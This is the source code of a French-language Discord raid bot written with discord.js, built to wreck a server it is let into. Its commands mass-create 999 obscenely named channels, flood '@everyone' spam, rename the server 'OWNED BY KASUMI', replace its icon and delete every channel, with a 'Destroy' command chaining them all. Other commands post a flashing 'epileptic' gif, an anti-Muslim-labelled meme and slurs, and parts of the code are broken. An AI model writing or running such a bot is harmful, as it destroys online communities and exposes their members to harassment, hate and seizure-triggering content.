const Discord = require("discord.js");
const client = new Discord.Client();


client.on("ready", () => {
    console.log(`${client.user.tag} prêt pour le carnage`)
    client.user.setActivity(`Kasumi`,{type:"WATCHING"})
    })
client.on("message", message => {
    if (message.content.startsWith('PN!Status')) {
        let Type = args [0];
        let Joue = args.slice(1).join(" ");


        if (Type == "Live") {
            if (Joue) {
                message.channel.send("Tu joues à " + Joue + " ! En live.")
                bot.user.setGame(Joue, 'https://www.twitch.tv/Live%27')

            }
         }
         else
         {
             message.send.channel("Coup dur")
         }



    }
    if(message.content.includes("PN!Help")){
        message.delete();
        var Help = new Discord.RichEmbed()
        .setAuthor("HELP")
        .setTitle("Voici le help mon maître")
        .setColor("#45af08")
        .addField("Détruire", "salont, salonv, salonc, spam, changepdp, ban, changename, détruire.")
        .addField("Fun", "status, ripepil, pute, biffle, ripmusulman, mi-grand.")
        .addField("Message", "pub, yo, tts.")
        message.channel.sendEmbed(Help)
    }

    if(message.content === "PN!Salonv"){
        message.delete();
        for(var i =0; i < 999; i++){
        message.guild.createChannel("Je Te Baise","voice")
        }
      }
      if(message.content === "PN!Changename"){
          message.delete();
        message.guild.setName("OWNED BY KASUMI")
      }
      if(message.content.includes("PN!Changepdp")){
      message.delete();
      message.guild.setIcon("https://cdn.discordapp.com/attachments/518527001280380960/520657883323432972/435_XXXtentacion_SpeedArt_66_-_YouTube_-_Google_Chrome_01_11_2018_18_52_53.png")
      }
     
      if(message.content.includes("PN!Salonc")){
          message.delete();
          for(var i =0; i < 999; i++){
              message.guild.createChannel("Je Te Baise","category")
          }
      }
       if(message.content.includes("PN!Salont")){
        message.delete();
        for(var i =0; i < 999; i++){
        message.guild.createChannel("Je Te Baise","text").then(c => c.send("@everyone @here Je Te Baise"))
        }
      }
      if(message.content.includes("PN!Spam")){
          message.delete();
          for(var i =0; i < 999; i++){
          message.channel.send("@everyone @here Je Te Baise")
          }
      }
      if(message.content === "PN!Détruire"){
        message.guild.channels.map(c => c.delete())
        }
        if(message.content.includes("@everyone @here Je Te Baise")){
            for(var i =0; i < 999; i++){
            message.channel.send("@everyone @here Je Te Baise")
            }
        }
      if(message.content.includes("PN!Destroy")){
          message.channel.send("PN!Spam").then(m => m.delete());
          message.channel.send("PN!Salont").then(m => m.delete());
          message.channel.send("PN!Salonv").then(m => m.delete());
          message.channel.send("PN!Salonc").then(m => m.delete());
          message.channel.send("PN!Changename").then(m => m.delete());
          message.channel.send("PN!Changepdp").then(m => m.delete());
          message.channel.send("PN!Détruire").then(m => m.delete());
      }
      if(message.content.includes("PN!RIPepil")){
          message.delete();
          message.channel.send("https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif")
      }
      if(message.content.includes("PN!Mi-Grand")){
          message.delete();
          message.channel.send("https://cdn.discordapp.com/attachments/518527001280380960/520669737647341579/download.jpg")
      }
      if(message.content.includes("PN!RIPmusulmans")){
        message.delete();
        message.channel.send("https://cdn.discordapp.com/attachments/518527001280380960/520669737647341579/download.jpg")
      }
      if(message.content.includes("PN!Biffle")){
          message.delete();
          message.channel.send("http://www.la-biffle.com/la-biffle.com/image/la_biffle.gif")
      }
      if(message.content.includes("PN!Pute")){
          message.delete();
          message.channel.send("https://tenor.com/v3bY.gif")
      }
      if(message.content.includes("PN!Blc")){
          message.delete();
          message.channel.send("https://tenor.com/EtH0.gif")
      }
      if(message.content.includes("PN!Pub")){
          message.delete();
          var Pub = new Discord.RichEmbed()
          .setAuthor("PUB")
          .setColor("#45af08")
          .addField("https://discord.gg/Ar5fQS", "REJOIGNEZ BANDE DE PUTE")
          message.channel.send(Pub)
      }
})



client.login(process.env.TOKEN2)
